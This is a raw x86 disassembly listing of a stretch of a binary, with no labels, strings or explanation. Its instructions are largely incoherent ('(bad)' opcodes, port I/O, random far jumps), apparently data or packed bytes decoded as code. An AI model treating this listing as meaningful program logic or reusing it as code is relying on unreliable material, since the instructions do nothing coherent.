  42db65:	sbb    al,0x50
  42db67:	mov    ebp,0xb94e70d
  42db6c:	jae    0x42db6e
	...
  42dbd6:	mov    al,0x7a
  42dbd8:	pop    ds
  42dbd9:	ins    BYTE PTR es:[edi],dx
  42dbda:	fild   QWORD PTR [ebp-0xd]
  42dbdd:	(bad)  
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dbdb
  42dbe3:	and    al,0x68
  42dbe5:	arpl   WORD PTR [ecx+ebp*8+0x1],dx
  42dbe9:	add    bh,bh
  42dbeb:	add    BYTE PTR [eax],al
  42dbed:	add    al,bh
  42dbef:	mov    al,ds:0x1603f923
  42dbf4:	jecxz  0x42dbc6
  42dbf6:	cmc    
  42dbf7:	and    edx,0x86beb376
  42dbfd:	mov    cl,0xe0
  42dbff:	cmp    dh,ah
  42dc01:	icebp  
  42dc02:	mov    WORD PTR [edi+0x0],ds
  42dc05:	out    dx,al
  42dc06:	mov    ecx,0x2c875931
  42dc0b:	data16 icebp 
  42dc0d:	mov    eax,0x524372f1
  42dc12:	test   DWORD PTR [ebp+ecx*1+0x2a],eax
  42dc16:	out    0xa6,eax
  42dc18:	out    0x3a,al
  42dc1a:	fiadd  WORD PTR [edi+edx*2]
  42dc1d:	and    DWORD PTR [ebp-0x51784928],0xec1aee2d
  42dc27:	les    eax,FWORD PTR [edi+eiz*1+0x4c]
  42dc2b:	dec    esi
  42dc2c:	enter  0x7651,0x3
  42dc30:	mov    ebp,0xb8ae99a5
  42dc35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc36:	xchg   esi,eax
  42dc37:	mov    ebx,DWORD PTR [eax+eax*8-0x78]
  42dc3b:	dec    eax
  42dc3c:	adc    BYTE PTR ds:0x428bd205,0x90
  42dc43:	call   0x219255b5
  42dc48:	(bad)  
  42dc49:	dec    edx
  42dc4a:	bound  ecx,QWORD PTR [eax-0x61]
  42dc4d:	retf   0x243c
  42dc50:	adc    al,0x14
  42dc52:	and    esp,DWORD PTR [ebx-0x768a96e7]
  42dc58:	fwait
  42dc59:	loop   0x42dbee
  42dc5b:	adc    DWORD PTR [esi+0x5d604af8],0xffffffda
  42dc62:	ret    0x5349
  42dc65:	das    
  42dc66:	(bad)  
  42dc67:	loopne 0x42dc4b
  42dc69:	push   ecx
  42dc6a:	jae    0x42dc31
  42dc6c:	xor    eax,0x62f8fd7f
  42dc71:	and    eax,0xffa2c9e1
  42dc76:	xchg   esi,eax
  42dc77:	dec    edx
  42dc78:	sub    al,0x34
  42dc7a:	imul   cx,WORD PTR [esi],0xb586
  42dc7f:	jmp    0x16ce:0xcc94d3ce
  42dc86:	pop    ecx
  42dc87:	adc    edi,DWORD PTR [edi+0x7889e1de]
  42dc8d:	test   ch,0x22
  42dc90:	mov    eax,ds:0x15a2ca22
  42dc95:	inc    ebx
  42dc96:	iret   
  42dc97:	mov    ebp,0xc64a6fd5
  42dc9c:	xor    eax,0x46f17350
  42dca1:	pop    esp
  42dca2:	jb     0x42dc36
  42dca4:	add    DWORD PTR [edi+0x69],ebp
  42dca7:	inc    ebp
  42dca8:	loopne 0x42dcde
  42dcaa:	adc    al,0xce
  42dcac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dcad:	mov    edi,0x61ecb1c4
  42dcb2:	jmp    0x42dd21
  42dcb4:	loop   0x42dd14
  42dcb6:	fidivr WORD PTR [eax+0x5da6ced6]
  42dcbc:	xchg   DWORD PTR [ecx],ecx
  42dcbe:	xlat   BYTE PTR ds:[ebx]
  42dcbf:	mov    dl,0xe9
  42dcc1:	dec    edi
  42dcc2:	aaa    
  42dcc3:	(bad)  
  42dcc4:	jb     0x42dcf9
  42dcc6:	arpl   WORD PTR [eax+0x8],bp
  42dcc9:	push   esi
  42dcca:	cs and eax,0xc40fa53a
  42dcd0:	dec    edi
  42dcd1:	add    cl,BYTE PTR [ebx-0x46feb832]
  42dcd7:	out    0x25,eax
  42dcd9:	mov    ah,0x91
  42dcdb:	imul   edi,DWORD PTR [ecx-0x76a8eeb7],0xffffffc4
  42dce2:	inc    eax
  42dce3:	fimul  WORD PTR ds:0x1d13dc52
  42dce9:	xor    BYTE PTR [esi+0xd0ef],al
	...
  42dd53:	add    BYTE PTR [eax],al
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	jo     0x42dd65
  42dd64:	xchg   esi,eax
  42dd65:	cld    
  42dd66:	push   ebx
  42dd67:	jmp    0x0:0xff0001
  42dd6e:	mov    eax,ds:0x9d102c11
  42dd73:	xchg   esi,eax
  42dd74:	test   al,0x2d
  42dd76:	loope  0x42dd1e
  42dd78:	xlat   BYTE PTR ds:[bx]
  42dd7a:	mov    ebp,ds
  42dd7c:	loopne 0x42dd3e
  42dd7e:	push   es
  42dd7f:	arpl   WORD PTR [edi-0x2b],sp
  42dd82:	jmp    0x42dda8
  42dd84:	cmp    edx,esi
  42dd86:	mov    al,0xc4
  42dd88:	(bad)  
  42dd89:	stos   DWORD PTR es:[edi],eax
  42dd8a:	push   0x5c
  42dd8c:	sar    DWORD PTR [ecx-0x2],0xe2
  42dd90:	(bad)  
  42dd91:	lock adc ebx,DWORD PTR [ebx]
  42dd94:	sub    al,0x6
  42dd96:	inc    ecx
  42dd97:	or     al,0x48
  42dd99:	push   cs
  42dd9a:	mov    cl,0xfa
  42dd9c:	shl    DWORD PTR [edx],1
  42dd9e:	clc    
  42dd9f:	xor    bh,dh
  42dda1:	call   0xcb37eaba
  42dda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dda7:	fimul  DWORD PTR [esi+0x68]
  42ddaa:	inc    esi
  42ddab:	jne    0x42de19
  42ddad:	clc    
  42ddae:	mov    bl,cl
  42ddb0:	sub    eax,0x46b1cb89
  42ddb5:	les    ebp,FWORD PTR [eax-0x17]
  42ddb8:	and    al,0xdb
  42ddba:	mov    edi,DWORD PTR [ebp+0x40d851a4]
  42ddc0:	sbb    cl,bl
  42ddc2:	push   edi
  42ddc3:	mov    eax,ds:0x4224c5a9
  42ddc8:	adc    al,0x86
  42ddca:	fdiv   DWORD PTR [edi+0x77853623]
  42ddd0:	cmp    eax,0xf484c62f
  42ddd5:	jle    0x42dde1
  42ddd7:	jns    0x42de57
  42ddd9:	jmp    0x7cabbdf8
  42ddde:	xor    al,0xc0
  42dde0:	or     al,0x59
  42dde2:	out    dx,eax
  42dde3:	or     dl,BYTE PTR [edi-0x714345b3]
  42dde9:	popf   
  42ddea:	inc    ebx
  42ddeb:	fwait
  42ddec:	stos   DWORD PTR es:[edi],eax
  42dded:	(bad)  [edx-0x1a]
  42ddf0:	addr16 add eax,0x774f5ee4
  42ddf6:	dec    eax
  42ddf7:	popf   
  42ddf8:	add    ebp,DWORD PTR [ecx-0x5a077fc5]
  42ddfe:	mov    edx,0xc618c971
  42de03:	add    ah,BYTE PTR [ecx]
  42de05:	fidivr WORD PTR [esi-0x25]
  42de08:	cmp    eax,0xa85424ad
  42de0d:	lods   al,BYTE PTR ds:[esi]
  42de0e:	repz and dh,dl
  42de11:	and    DWORD PTR [ecx+0x7c],esi
  42de14:	out    0x98,eax
  42de16:	(bad)  
  42de18:	scas   al,BYTE PTR es:[edi]
  42de19:	mov    DWORD PTR [ebx-0x13740075],ebp
  42de1f:	mov    ebp,0xe3e8e8ea
  42de24:	adc    BYTE PTR [ebp+0x6],ah
  42de27:	fsubr  DWORD PTR [esi+0x3f7562f2]
  42de2d:	cmp    BYTE PTR [ecx-0x6d],dl
  42de30:	and    al,0x4c
  42de32:	aaa    
  42de33:	(bad)  
  42de35:	div    DWORD PTR ds:0xa24269ef
  42de3b:	outs   dx,DWORD PTR ds:[esi]
  42de3c:	or     al,0x30
  42de3f:	dec    esi
  42de40:	sbb    al,0x9e
  42de42:	push   edi
  42de43:	cmp    al,0x4c
  42de45:	cmp    ebx,DWORD PTR [eax+0x688d3c8f]
  42de4b:	scas   al,BYTE PTR es:[edi]
  42de4c:	repz aam 0xa7
  42de4f:	inc    ebp
  42de50:	jg     0x42de33
  42de52:	int3   
  42de53:	inc    eax
  42de54:	lods   al,BYTE PTR ds:[esi]
  42de55:	(bad)
  42de59:	aam    0x9e
  42de5b:	adc    al,0x76
  42de5d:	sahf   
  42de5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de5f:	int    0x1a
  42de61:	ret    0x5562
  42de64:	hlt    
  42de65:	sbb    ah,BYTE PTR [edx]
  42de67:	clc    
  42de68:	xchg   esp,eax
  42de69:	std    
  42de6a:	push   ds
  42de6b:	scas   eax,DWORD PTR es:[edi]
  42de6c:	sahf   
	...
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	jne    0x42deba
  42dee4:	hlt    
  42dee5:	fst    QWORD PTR [edx-0x15]
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	inc    DWORD PTR [eax]
  42deec:	add    BYTE PTR [eax],al
  42deee:	sbb    al,0xe0
  42def0:	pusha  
  42def1:	cmp    ecx,DWORD PTR [ebp-0x1babfded]
  42def7:	sub    BYTE PTR [ebx+0x74cfb50a],bl
  42defd:	sub    DWORD PTR [edx+0x559fbd45],ebx
  42df03:	add    eax,0x2ee45273
  42df08:	shl    cl,cl
  42df0a:	adc    al,0x39
  42df0c:	inc    ebp
  42df0d:	add    ah,BYTE PTR [edi+0x5a4c705c]
  42df13:	mov    ecx,0xc10a5ec6
  42df18:	mov    dh,0x44
  42df1a:	add    al,0x7d
  42df1c:	or     ax,0x5bbf
  42df20:	in     al,0xa9
  42df22:	daa    
  42df23:	mov    edi,0x94b733ac
  42df28:	jmp    0x42df3c
  42df2a:	test   DWORD PTR [eax-0x2c3d28e7],ecx
  42df30:	test   al,0xc7
  42df32:	cwde   
  42df33:	mov    cl,0x55
  42df35:	or     BYTE PTR [edi+0x4c],ah
  42df38:	popf   
  42df39:	and    bl,dh
  42df3b:	loope  0x42df38
  42df3d:	xor    BYTE PTR [edx+edx*4],bl
  42df40:	test   eax,0x57d0a3fa
  42df45:	imul   edi,DWORD PTR [edx],0xd0127953
  42df4b:	add    al,ah
  42df4d:	add    ebx,esp
  42df4f:	outs   dx,BYTE PTR ds:[esi]
  42df50:	aas    
  42df51:	jle    0x42df54
  42df53:	and    ecx,esp
  42df55:	add    cl,BYTE PTR [edx-0x55]
  42df58:	pop    ss
  42df59:	rol    DWORD PTR [ecx],cl
  42df5b:	xor    BYTE PTR [edi+0x4260f021],0xf4
  42df62:	mov    bl,0x93
  42df64:	stos   BYTE PTR es:[edi],al
  42df65:	adc    eax,0x1c58537
  42df6a:	test   eax,0x9042a68d
  42df6f:	aad    0xdb
  42df71:	pop    edi
  42df72:	lahf   
  42df73:	mov    ecx,0x76057e7e
  42df78:	jge    0x42df47
  42df7a:	iret   
  42df7b:	fidiv  DWORD PTR [ebp+0x13]
  42df7e:	out    dx,eax
  42df7f:	mov    bh,0x5b
  42df81:	xchg   edi,eax
  42df82:	cmp    BYTE PTR [edi-0x32],cl
  42df85:	add    al,0xb3
  42df87:	and    bl,BYTE PTR [esi]
  42df89:	stos   DWORD PTR es:[edi],eax
  42df8a:	pop    esi
  42df8b:	mov    ah,0xdc
  42df8d:	lahf   
  42df8e:	xchg   DWORD PTR [edx],ecx
  42df90:	mov    ds:0x520fbfa7,al
  42df95:	xor    DWORD PTR [ebx+0x79376ed4],esi
  42df9b:	push   0xffffffe7
  42df9d:	rol    BYTE PTR [ebp-0x35274c5c],0x6f
  42dfa4:	daa    
  42dfa5:	arpl   WORD PTR [edx],bx
  42dfa7:	mov    esi,0xcb9a7c22
  42dfac:	push   esi
  42dfad:	pop    ds
  42dfae:	dec    ebp
  42dfaf:	lock retf 
  42dfb1:	imul   esp,edx,0x57
  42dfb4:	inc    esp
  42dfb5:	cdq    
  42dfb6:	adc    bh,BYTE PTR [ebx]
  42dfb8:	paddsb mm0,QWORD PTR [ebp+0x3b96f06f]
  42dfbf:	fadd   st,st(4)
  42dfc1:	lds    edi,FWORD PTR ds:[edx]
  42dfc4:	iret   
  42dfc5:	(bad)  [edi+0xb064d41]
  42dfcb:	in     al,dx
  42dfcc:	test   DWORD PTR [ebp-0x3bfab3b3],ebp
  42dfd2:	pushf  
  42dfd3:	ja     0x42e01e
  42dfd5:	hlt    
  42dfd6:	add    ch,BYTE PTR [ebx-0x52]
  42dfd9:	xor    al,BYTE PTR [esi+edi*8]
  42dfdc:	rcr    BYTE PTR ds:0xf82a71f6,1
  42dfe2:	repnz retf 
  42dfe4:	popa   
  42dfe5:	lahf   
  42dfe6:	jle    0x42dfd5
  42dfe8:	add    edi,DWORD PTR [ebp+edx*2+0x81b1]
	...
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    BYTE PTR [edx],al
  42e057:	(bad)  
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi+0x5f]
  42e063:	push   cs
  42e064:	xor    DWORD PTR [eax+0x1ec51],0xffffffff
  42e06b:	add    BYTE PTR [eax],al
  42e06d:	add    BYTE PTR [edi+0x2d],ch
  42e070:	dec    ecx
  42e071:	push   es
  42e072:	sub    DWORD PTR [eax],ecx
  42e074:	fsub   QWORD PTR [edx-0x7d3980b8]
  42e07a:	cs mov dl,0x44
  42e07d:	pop    ebp
  42e07e:	(bad)  
  42e07f:	xchg   ebp,eax
  42e080:	pop    esi
  42e081:	es mov eax,eax
  42e084:	imul   ecx,DWORD PTR ds:0xbcc155ba,0x7a90d003
  42e08e:	sub    eax,0xc50ed1eb
  42e093:	hlt    
  42e094:	or     DWORD PTR [edx],edi
  42e096:	loopne 0x42e104
  42e098:	xchg   edi,eax
  42e099:	in     al,dx
  42e09a:	push   edi
  42e09b:	inc    edx
  42e09c:	pop    es
  42e09d:	cmp    esi,eax
  42e09f:	pop    esp
  42e0a0:	inc    esp
  42e0a1:	in     eax,dx
  42e0a2:	mov    eax,0xd859ea42
  42e0a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0a9:	es or  al,0x38
  42e0ac:	leave  
  42e0ad:	rcl    ah,0x2c
  42e0b0:	popf   
  42e0b1:	and    BYTE PTR [edx-0x24],cl
  42e0b4:	push   0xa4e46185
  42e0b9:	in     eax,dx
  42e0ba:	adc    bl,al
  42e0bc:	ins    BYTE PTR es:[edi],dx
  42e0bd:	popa   
  42e0be:	jmp    0x42e069
  42e0c0:	stc    
  42e0c1:	(bad)  
  42e0c2:	sbb    ebx,DWORD PTR [edx-0x7f39468]
  42e0c8:	test   eax,0xb35672d5
  42e0cd:	jnp    0x42e054
  42e0cf:	out    dx,al
  42e0d0:	sar    dh,0x4d
  42e0d3:	(bad)  
  42e0d5:	cs mov esi,0x65addeb8
  42e0db:	pusha  
  42e0dc:	sub    DWORD PTR [ecx-0x1bfb9331],0x19
  42e0e3:	or     dh,BYTE PTR [eax+0x32]
  42e0e6:	or     al,0xe7
  42e0e8:	and    al,BYTE PTR [ebp+0x5e]
  42e0eb:	push   edx
  42e0ec:	(bad)  
  42e0ed:	(bad)  
  42e0ee:	aam    0xf8
  42e0f0:	sti    
  42e0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e0f2:	cs or  eax,0x97afc377
  42e0f8:	lods   eax,DWORD PTR ds:[esi]
  42e0f9:	call   0x29fb78ac
  42e0fe:	sbb    al,0x5a
  42e100:	add    eax,0x2f3fe1e7
  42e105:	les    ecx,FWORD PTR [edi+eiz*4]
  42e108:	aad    0x98
  42e10a:	jae    0x42e0f7
  42e10c:	cmp    eax,DWORD PTR [ebx+0x1]
  42e10f:	sahf   
  42e110:	out    0xda,eax
  42e112:	mov    esi,0x3181b48b
  42e117:	(bad)  
  42e118:	cmc    
  42e119:	lea    esi,[eax-0x422af397]
  42e11f:	push   esp
  42e120:	stos   DWORD PTR es:[edi],eax
  42e121:	xchg   esp,eax
  42e122:	pop    eax
  42e123:	sbb    esi,edx
  42e125:	mov    cl,0xa5
  42e127:	fst    DWORD PTR [ebx+0x78]
  42e12a:	lock jo 0x42e0d9
  42e12d:	pop    edi
  42e12e:	pop    ss
  42e12f:	mov    WORD PTR [ecx],?
  42e131:	xchg   edx,eax
  42e132:	clc    
  42e133:	call   0xd9d19673
  42e138:	rcr    DWORD PTR [edx+edi*4],cl
  42e13b:	pop    es
  42e13c:	repnz (bad) 
  42e13e:	mov    ds:0x5a56df54,al
  42e143:	dec    esi
  42e144:	retf   0xf9b
  42e147:	pop    ebp
  42e148:	mov    ebp,0xa8682dcc
  42e14d:	jg     0x42e0df
  42e14f:	mov    DWORD PTR [ebx+0x24],esp
  42e152:	lods   al,BYTE PTR ds:[esi]
  42e153:	inc    esi
  42e154:	inc    edx
  42e155:	dec    ebx
  42e156:	fbld   TBYTE PTR [edi]
  42e158:	sti    
  42e159:	mov    dl,0x6
  42e15b:	dec    esp
  42e15c:	je     0x42e1c1
  42e15e:	stos   BYTE PTR es:[edi],al
  42e15f:	jmp    0x42e110
  42e161:	pop    es
  42e162:	repz ret 
  42e164:	adc    BYTE PTR [ecx-0xe07dfd6],ch
  42e16a:	cdq    
  42e16b:	jp     0x42e126
	...
  42e1d5:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	mov    al,0x97
  42e1e4:	nop
  42e1e5:	jge    0x42e237
  42e1e7:	in     eax,dx
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	inc    DWORD PTR [eax]
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	lods   al,BYTE PTR ds:[esi]
  42e1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1f0:	fabs   
  42e1f2:	cli    
  42e1f3:	test   DWORD PTR [ebx+0xf87648e],edx
  42e1f9:	repz (bad) 
  42e1fb:	push   ds
  42e1fc:	or     edi,edx
  42e1fe:	dec    eax
  42e1ff:	fsubr  QWORD PTR [esi]
  42e201:	addr16 in al,dx
  42e203:	clc    
  42e204:	sbb    eax,0x72ccf4e1
  42e209:	das    
  42e20a:	adc    al,0xcc
  42e20c:	fst    DWORD PTR [edi+edi*1-0x78dd48e8]
  42e213:	mov    bl,ch
  42e215:	lock in eax,0xe4
  42e218:	sar    DWORD PTR [ecx+0x23aa21b],1
  42e21e:	xchg   ebx,eax
  42e21f:	test   eax,0x82994ee3
  42e224:	out    0xc8,al
  42e226:	sbb    esi,DWORD PTR [edx]
  42e228:	push   edi
  42e229:	pop    ecx
  42e22a:	iret   
  42e22b:	cmp    BYTE PTR [eax+0x15],ch
  42e22e:	add    dl,0xf1
  42e231:	add    DWORD PTR [ebp+0x5c],esi
  42e234:	xchg   BYTE PTR [ebx],bl
  42e236:	sub    esp,DWORD PTR [edi+eax*8+0x51]
  42e23a:	mov    ebp,0x26480d0a
  42e23f:	in     al,0xbf
  42e241:	dec    ebp
  42e242:	(bad)
  42e245:	nop
  42e246:	shr    BYTE PTR [edi+0x53],cl
  42e249:	or     ebp,DWORD PTR [eax]
  42e24b:	ss retf 
  42e24d:	out    dx,eax
  42e24e:	pop    esp
  42e24f:	mov    ebx,ebp
  42e251:	xor    BYTE PTR [ecx],dh
  42e253:	sbb    al,0x18
  42e255:	pop    DWORD PTR [ebp-0x67]
  42e258:	mov    ebx,0xc0c72903
  42e25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e25e:	push   ds
  42e25f:	mov    esp,0x8a843761
  42e264:	ret    0xe1eb
  42e267:	rcl    BYTE PTR [esi+0x6b],0x6f
  42e26b:	mov    esi,0x248b53dc
  42e270:	inc    edi
  42e271:	add    eax,0x13dccccc
  42e276:	push   0xffffffad
  42e278:	or     eax,0x33197224
  42e27d:	ins    BYTE PTR es:[edi],dx
  42e27e:	mov    bh,0xf6
  42e280:	mov    edx,0x1bcbd000
  42e285:	test   eax,0xb12b540c
  42e28a:	pop    ebp
  42e28b:	and    esp,ecx
  42e28d:	imul   edx,ecx,0xa89b0b03
  42e293:	jle    0x42e253
  42e295:	sub    dl,ah
  42e297:	test   BYTE PTR [eax-0x72efed10],bh
  42e29d:	outs   dx,DWORD PTR ds:[esi]
  42e29e:	test   eax,0xa5514f21
  42e2a3:	dec    ecx
  42e2a4:	cmc    
  42e2a5:	std    
  42e2a6:	jno    0x42e2c6
  42e2a8:	ret    0xc96b
  42e2ab:	mov    ds:0xdcb0dab1,eax
  42e2b0:	shr    BYTE PTR [edi-0x48a8b32f],0xbe
  42e2b7:	outs   dx,DWORD PTR ds:[esi]
  42e2b8:	lahf   
  42e2b9:	lahf   
  42e2ba:	sahf   
  42e2bb:	pop    esi
  42e2bc:	pop    ss
  42e2bd:	fisttp DWORD PTR [esi+0x124f7630]
  42e2c3:	mov    DWORD PTR [esi-0x67ceb47],edi
  42e2c9:	push   esi
  42e2ca:	jmp    0x42e301
  42e2cc:	and    BYTE PTR [edx-0xf],cl
  42e2cf:	jne    0x42e310
  42e2d1:	jnp    0x42e30d
  42e2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2d4:	(bad)  
  42e2d5:	mov    esi,0xb0360187
  42e2da:	sub    BYTE PTR [edx+0x6b30fd55],al
  42e2e0:	stc    
  42e2e1:	js     0x42e316
  42e2e3:	push   cs
  42e2e4:	or     al,cl
  42e2e6:	pop    ds
  42e2e7:	call   0x3f:0xe5a402c6
	...
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0xc2199140
  42e363:	adc    esi,DWORD PTR [eax+0x58]
  42e366:	dec    edi
  42e367:	out    dx,al
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	inc    DWORD PTR [eax]
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	push   es
  42e36f:	in     eax,0x8c
  42e371:	fcmovnu st,st(7)
  42e373:	addr16 int3 
  42e375:	out    dx,eax
  42e376:	cmp    DWORD PTR [edi],0x49
  42e379:	cld    
  42e37a:	xor    al,0xb7
  42e37c:	fwait
  42e37d:	mov    dl,0x91
  42e37f:	popa   
  42e380:	test   edx,edi
  42e382:	pop    ebp
  42e383:	xor    BYTE PTR ds:0x7a28d08,dl
  42e389:	push   esp
  42e38a:	loope  0x42e3fc
  42e38c:	adc    ah,ah
  42e38e:	rcr    DWORD PTR [ebp-0x2c],0xa0
  42e392:	jg     0x42e320
  42e394:	cmc    
  42e395:	int3   
  42e396:	sbb    DWORD PTR [ecx+0x22a6b303],ebx
  42e39c:	mov    ebp,0xd428d85b
  42e3a1:	pop    ebx
  42e3a2:	(bad)  
  42e3a3:	fdiv   st(1),st
  42e3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3a6:	and    eax,0xebdb9f48
  42e3ab:	sbb    ebx,ebx
  42e3ad:	call   0x78a9cf5a
  42e3b2:	enter  0x4208,0xe0
  42e3b6:	mov    BYTE PTR [ebx],dl
  42e3b8:	add    al,0xea
  42e3ba:	jle    0x42e3f0
  42e3bc:	jnp    0x42e406
  42e3be:	imul   esp,DWORD PTR [esi+0x636e64d9],0x71
  42e3c5:	sub    dl,ah
  42e3c7:	outs   dx,DWORD PTR ds:[esi]
  42e3c8:	aad    0xe1
  42e3ca:	mov    esp,0x96e6145f
  42e3cf:	mov    edx,0x21d1c09b
  42e3d4:	repnz push ecx
  42e3d6:	ret    
  42e3d7:	ret    
  42e3d8:	xchg   BYTE PTR [esi+0x5983b7cb],ch
  42e3de:	add    eax,0xee64b1bb
  42e3e3:	in     al,0xe
  42e3e5:	pop    ss
  42e3e6:	dec    esi
  42e3e7:	not    DWORD PTR [eax-0x14c7b8c]
  42e3ed:	mov    dl,0x17
  42e3ef:	mov    DWORD PTR [ebx+eiz*4-0x7f],0x6a0bb733
  42e3f7:	dec    BYTE PTR [ebp+ebx*4-0x20921692]
  42e3fe:	sbb    edi,eax
  42e400:	in     al,0xf4
  42e402:	rcr    DWORD PTR ds:0xf0787d95,cl
  42e408:	and    ah,BYTE PTR [ecx+0x7d]
  42e40b:	jecxz  0x42e3cb
  42e40d:	les    edx,FWORD PTR [ecx-0x29852be9]
  42e413:	rcl    BYTE PTR [ecx-0x17],0x40
  42e417:	cmp    eax,0xf9c2d412
  42e41c:	ja     0x42e495
  42e41e:	pop    esp
  42e41f:	jecxz  0x42e466
  42e421:	cmp    al,0x29
  42e423:	push   esp
  42e424:	sbb    esi,DWORD PTR [esi]
  42e426:	adc    ah,BYTE PTR [edx]
  42e428:	adc    BYTE PTR [ebx],cl
  42e42a:	mov    dl,0xd6
  42e42c:	bound  eax,QWORD PTR [esi]
  42e42e:	inc    DWORD PTR [eax+ebp*1+0x26]
  42e432:	push   ss
  42e433:	mov    edx,0x650af3c4
  42e438:	test   BYTE PTR [ebx+ecx*2],bh
  42e43b:	fist   WORD PTR [edi]
  42e43d:	fdivp  st(0),st
  42e43f:	dec    edx
  42e440:	(bad)  
  42e441:	test   eax,0xbfc407c6
  42e446:	mov    al,0x71
  42e448:	(bad)  
  42e449:	ss enter 0xfb30,0x65
  42e44e:	shl    BYTE PTR [ecx],0x25
  42e451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e452:	fisubr DWORD PTR [edx]
  42e454:	xchg   esi,eax
  42e455:	pop    esp
  42e456:	pop    eax
  42e457:	repnz mov fs:0x723be92f,eax
  42e45e:	pop    es
  42e45f:	and    eax,0xc51a974a
  42e464:	je     0x42e3e8
  42e466:	mov    dh,BYTE PTR [edi]
  42e468:	ds hlt 
  42e46a:	sub    BYTE PTR ds:[ebx],cl
	...
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	sub    bl,bl
  42e4e4:	mov    eax,0x1ef4e35
  42e4e9:	add    bh,bh
  42e4eb:	add    BYTE PTR [eax],al
  42e4ed:	add    cl,bh
  42e4ef:	pop    ebx
  42e4f0:	cs retf 
  42e4f2:	ffree  st(2)
  42e4f4:	or     cl,BYTE PTR [edx+0x63cf79b7]
  42e4fa:	mov    esp,0x1eb9c01f
  42e4ff:	aas    
  42e500:	and    BYTE PTR [eax],bh
  42e502:	das    
  42e503:	jg     0x42e54e
  42e505:	test   DWORD PTR [ecx*4-0x32d246bd],ecx
  42e50c:	lods   eax,DWORD PTR ds:[esi]
  42e50d:	ret    
  42e50e:	mov    dh,0x7d
  42e510:	in     eax,0x92
  42e512:	jb     0x42e4f0
  42e514:	test   eax,0x3b4f3d0c
  42e519:	pop    esp
  42e51a:	fsub   QWORD PTR [ecx+eiz*4]
  42e51d:	lods   al,BYTE PTR ds:[esi]
  42e51e:	add    al,0xa5
  42e520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e521:	js     0x42e4cd
  42e523:	jl     0x42e4e1
  42e525:	ss iret 
  42e527:	loopne 0x42e4b1
  42e529:	loop   0x42e558
  42e52b:	popa   
  42e52c:	bound  eax,QWORD PTR [edx+edi*2]
  42e52f:	pop    ds
  42e530:	cmp    eax,0x16edb69c
  42e535:	mov    WORD PTR ds:0xc6d75af7,?
  42e53b:	and    DWORD PTR [ebx+0x35],ebp
  42e53e:	loop   0x42e529
  42e540:	shr    BYTE PTR [esi],1
  42e542:	dec    esi
  42e543:	pop    ecx
  42e544:	out    0xbe,eax
  42e546:	int3   
  42e547:	das    
  42e548:	pop    esi
  42e549:	mov    WORD PTR [eax-0x42bb5ab7],?
  42e54f:	inc    esp
  42e550:	dec    eax
  42e551:	and    eax,0xa4076a78
  42e556:	out    0xae,eax
  42e558:	mov    edi,DWORD PTR [esi]
  42e55a:	pop    es
  42e55b:	jbe    0x42e571
  42e55d:	add    ecx,DWORD PTR [ebx]
  42e55f:	pop    ebp
  42e560:	call   0x1b63:0x52e16272
  42e567:	cmp    esp,DWORD PTR [ecx-0x4b835418]
  42e56d:	mov    ch,0xfe
  42e56f:	mov    al,0xfc
  42e571:	dec    ebx
  42e572:	pop    esi
  42e573:	inc    eax
  42e574:	mov    ah,0x94
  42e576:	mov    ds:0x4345cd6,eax
  42e57b:	cli    
  42e57c:	fmulp  st(1),st
  42e57e:	call   0xeaf637d1
  42e583:	mov    bh,0xfe
  42e585:	xchg   ebx,eax
  42e586:	xchg   edi,eax
  42e587:	ss (bad) 
  42e58a:	ins    DWORD PTR es:[di],dx
  42e58c:	jl     0x42e545
  42e58e:	sub    dh,ah
  42e590:	into   
  42e591:	leave  
  42e592:	cmp    ch,BYTE PTR [edi]
  42e594:	aaa    
  42e595:	enter  0x2c4e,0x14
  42e599:	jge    0x42e534
  42e59b:	retf   0xf14d
  42e59e:	adc    BYTE PTR [edi+0x16],0xe1
  42e5a2:	jl     0x42e556
  42e5a4:	dec    ebp
  42e5a5:	jecxz  0x42e589
  42e5a7:	mov    ds:0x404bb495,eax
  42e5ac:	out    dx,eax
  42e5ad:	jns    0x42e55a
  42e5af:	std    
  42e5b0:	pop    edi
  42e5b1:	adc    esp,DWORD PTR [eax+eiz*4]
  42e5b4:	push   edx
